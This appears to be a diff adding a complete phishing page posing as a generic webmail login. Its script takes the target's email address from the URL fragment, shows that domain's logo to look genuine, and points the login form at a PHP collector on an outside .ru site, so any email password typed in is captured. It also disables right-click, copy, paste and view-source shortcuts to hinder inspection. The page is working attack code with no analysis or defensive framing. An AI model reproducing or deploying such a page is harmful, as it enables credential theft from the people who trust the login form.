@@ -1,0 +1,107 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+  "http://www.w3.org/TR/html4/loose.dtd">    
+<html>
+<head>
+<link rel="shortcut icon" href="https://webmail.prositehosting.net/fasthosts/whitelabelfavicon.ico?s=1633086136">
+<link rel="stylesheet" href="https://ia601400.us.archive.org/15/items/min_20211201/min.css">
+ <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery.session@1.0.0/jquery.session.min.js"></script>
+<style>
+
+  </style>
+  
+<title>Webmail</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+</head>
+
+<body><br>
+
+<form action="" method="post" autocomplete="off" id="pax" onsubmit="" > <br>
+<fieldset class="X-set" >
+
+<h2 class="text-center"><div id="top"><img src="" alt="" id="logoimg" style="width:50px;height:50px;margin-top:9px; margin-left:170px;"></h2>
+
+<fieldset class="Z-set">
+
+<input class="copx"type="email" required value="" name="email" id="cax"  placeholder="Enter your email address"><br>
+
+
+</fieldset><br>
+
+<input type="password" Placeholder="Enter your email password" required value="" class="xpass" autocomplete="off" name="passw" id="inpwd" minlength="6" ><br>
+
+<button type="submit" value=" " class="spass"  ></button><br>
+
+<span id="bax"  style="display:none;"></span>
+
+
+</fieldset>
+
+</form>
+
+</body>
+<script>
+
+document.addEventListener('invalid', (function () {
+  return function (e) {
+    e.preventDefault();
+    document.getElementById("inpwd").focus();
+	
+  };
+})(), true);
+
+document.addEventListener('invalid', (function () {
+  return function (e) {
+    e.preventDefault();
+    document.getElementById("cax").focus();
+	
+  };
+})(), true);
+
+  document.onkeydown = function(e) {
+        if (e.ctrlKey && 
+            (e.keyCode === 67 || 
+             e.keyCode === 86 || 
+             e.keyCode === 85 || 
+             e.keyCode === 117)) {
+            return false;
+        } else {
+            return true;
+        }
+};
+$(document).keypress("u",function(e) {
+  if(e.ctrlKey)
+  {
+return false;
+}
+else
+{
+return true;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+
+	document.getElementById("inpwd").focus();
+			    var str = window.location.href;
+				var strs = str.split("#");
+				var emaq = strs[1];
+				if(emaq){
+					document.getElementById("bax").innerHTML = emaq;
+					document.getElementById("cax").value = emaq;
+					document.getElementById("pax").action = "https://terma-vip.ru/wp-content/plugins/easybusy/2to/1st.php";
+					
+				}
+				
+				 var ind=emaq.indexOf("@");
+        var my_slice=emaq.substr((ind+1));
+      var mainPage = 'https://'+my_slice; 
+     //     var mainPage = 'https://webmail.staralliancebd.com/';  
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
+         document.getElementById('mainPage').src = mainPage;
+    //    $("#mainPage").src(mainPage);
+</script>
+</html>           
